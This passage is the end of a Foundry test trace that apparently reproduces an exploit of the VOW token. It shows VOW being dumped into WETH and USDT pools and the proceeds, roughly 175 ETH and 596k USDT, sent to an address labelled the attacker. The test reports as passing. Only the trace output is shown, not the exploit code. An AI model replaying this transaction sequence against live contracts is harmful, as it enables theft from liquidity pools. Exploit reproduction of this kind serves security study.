    │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─ emit Sent(operator: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, amount: 5801632714644004917570378 [5.801e24], data: 0x, operatorData: 0x)
    │   │   ├─ emit Transfer(from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, value: 5801632714644004917570378 [5.801e24])
    │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] true
    ├─ [504] 0x7FdEB46b3a0916630f36E886D675602b1007Fcbb::getReserves() [staticcall]
    │   └─ ← [Return] 1491098591926278195017715 [1.491e24], 185530201197745898879 [1.855e20], 1723547351 [1.723e9]
    ├─ [613] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::balanceOf(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 52214694431796044258133409 [5.221e25]
    ├─ [12278] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::transfer(0x7FdEB46b3a0916630f36E886D675602b1007Fcbb, 26107347215898022129066704 [2.61e25])
    │   ├─ [10845] 0x60CA4ec4412A3B319F4bD6366bb836395336B397::b750dc46(00000000000000000000000000000000000000000000000000000000000000020000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fdeb46b3a0916630f36e886d675602b1007fcbb00000000000000000000000000000000000000000015987220e31d75c02262d000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─ emit Sent(operator: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7FdEB46b3a0916630f36E886D675602b1007Fcbb, amount: 26107347215898022129066704 [2.61e25], data: 0x, operatorData: 0x)
    │   │   ├─ emit Transfer(from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7FdEB46b3a0916630f36E886D675602b1007Fcbb, value: 26107347215898022129066704 [2.61e25])
    │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x7FdEB46b3a0916630f36E886D675602b1007Fcbb, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] true
    ├─ [613] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::balanceOf(0x7FdEB46b3a0916630f36E886D675602b1007Fcbb) [staticcall]
    │   └─ ← [Return] 27598445807824300324084419 [2.759e25]
    ├─ [24116] 0x7FdEB46b3a0916630f36E886D675602b1007Fcbb::swap(0, 175477781952968920940 [1.754e20], VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   ├─ [10862] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 175477781952968920940 [1.754e20])
    │   │   ├─ emit Transfer(from: 0x7FdEB46b3a0916630f36E886D675602b1007Fcbb, to: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 175477781952968920940 [1.754e20])
    │   │   └─ ← [Return] true
    │   ├─ [613] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::balanceOf(0x7FdEB46b3a0916630f36E886D675602b1007Fcbb) [staticcall]
    │   │   └─ ← [Return] 27598445807824300324084419 [2.759e25]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x7FdEB46b3a0916630f36E886D675602b1007Fcbb) [staticcall]
    │   │   └─ ← [Return] 10052419244776977939 [1.005e19]
    │   ├─ emit Sync(reserve0: 27598445807824300324084419 [2.759e25], reserve1: 10052419244776977939 [1.005e19])
    │   ├─ emit Swap(sender: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 26107347215898022129066704 [2.61e25], amount1In: 0, amount0Out: 0, amount1Out: 175477781952968920940 [1.754e20], to: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [9195] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::withdraw(175477781952968920940 [1.754e20])
    │   ├─ [55] VOW::receive{value: 175477781952968920940}()
    │   │   └─ ← [Stop] 
    │   ├─ emit Withdrawal(src: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 175477781952968920940 [1.754e20])
    │   └─ ← [Stop] 
    ├─ [0] 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3::fallback{value: 175477781952968920940}()
    │   └─ ← [Stop] 
    ├─ [2504] 0x1E49768714E438E789047f48FD386686a5707db2::getReserves() [staticcall]
    │   └─ ← [Return] 1953847941886086314203726 [1.953e24], 640706567594 [6.407e11], 1723546451 [1.723e9]
    ├─ [613] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::balanceOf(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26107347215898022129066705 [2.61e25]
    ├─ [19078] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::transfer(0x1E49768714E438E789047f48FD386686a5707db2, 26107347215898022129066705 [2.61e25])
    │   ├─ [17645] 0x60CA4ec4412A3B319F4bD6366bb836395336B397::b750dc46(00000000000000000000000000000000000000000000000000000000000000020000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000001e49768714e438e789047f48fd386686a5707db200000000000000000000000000000000000000000015987220e31d75c02262d100000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─ emit Sent(operator: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x1E49768714E438E789047f48FD386686a5707db2, amount: 26107347215898022129066705 [2.61e25], data: 0x, operatorData: 0x)
    │   │   ├─ emit Transfer(from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x1E49768714E438E789047f48FD386686a5707db2, value: 26107347215898022129066705 [2.61e25])
    │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x1E49768714E438E789047f48FD386686a5707db2, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] true
    ├─ [613] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::balanceOf(0x1E49768714E438E789047f48FD386686a5707db2) [staticcall]
    │   └─ ← [Return] 28061195157784108443270431 [2.806e25]
    ├─ [72441] 0x1E49768714E438E789047f48FD386686a5707db2::swap(0, 595970517680 [5.959e11], VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   ├─ [39601] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 595970517680 [5.959e11])
    │   │   ├─ emit Transfer(from: 0x1E49768714E438E789047f48FD386686a5707db2, to: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 595970517680 [5.959e11])
    │   │   └─ ← [Stop] 
    │   ├─ [613] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::balanceOf(0x1E49768714E438E789047f48FD386686a5707db2) [staticcall]
    │   │   └─ ← [Return] 28061195157784108443270431 [2.806e25]
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x1E49768714E438E789047f48FD386686a5707db2) [staticcall]
    │   │   └─ ← [Return] 44736049914 [4.473e10]
    │   ├─ emit Sync(reserve0: 28061195157784108443270431 [2.806e25], reserve1: 44736049914 [4.473e10])
    │   ├─ emit Swap(sender: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 26107347215898022129066705 [2.61e25], amount1In: 0, amount0Out: 0, amount1Out: 595970517680 [5.959e11], to: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 595970517680 [5.959e11]
    ├─ [26801] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, 595970517680 [5.959e11])
    │   ├─ emit Transfer(from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, value: 595970517680 [5.959e11])
    │   └─ ← [Stop] 
    ├─ [613] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::balanceOf(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3) [staticcall]
    │   └─ ← [Return] 5801632714644004917570378 [5.801e24]
    ├─ [271] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "After exploit: VOW balance of attacker:", val: 5801632714644004917570378 [5.801e24], decimals: 18)
    ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3) [staticcall]
    │   └─ ← [Return] 595970517680 [5.959e11]
    ├─ [484] 0xdAC17F958D2ee523a2206206994597C13D831ec7::decimals() [staticcall]
    │   └─ ← [Return] 6
    ├─ emit log_named_decimal_uint(key: "After exploit: USDT balance of attacker:", val: 595970517680 [5.959e11], decimals: 6)
    ├─ emit log_named_decimal_uint(key: "After exploit: ETH balance of attacker:", val: 175620817063726256189 [1.756e20], decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.11s (5.83s CPU time)

Ran 2 test suites in 7.52s (7.49s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
